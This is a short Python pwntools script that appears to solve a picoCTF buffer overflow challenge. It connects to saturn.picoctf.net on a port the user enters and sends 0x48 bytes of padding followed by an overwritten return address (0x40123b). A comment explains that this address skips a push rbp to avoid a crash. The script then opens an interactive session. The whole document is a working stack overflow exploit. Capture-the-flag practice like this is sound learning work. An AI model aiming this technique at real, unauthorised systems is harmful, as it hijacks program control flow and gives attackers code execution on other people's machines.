from pwn import *
port = int(input('port='))
r = remote('saturn.picoctf.net', port)
r.sendline(b'a' * (0x40 + 8) + p64(0x401236+0x5)); # jump to 0x40123b = 0x401236 + 0x5 to avoid segfaults from the push rbp function
r.interactive()
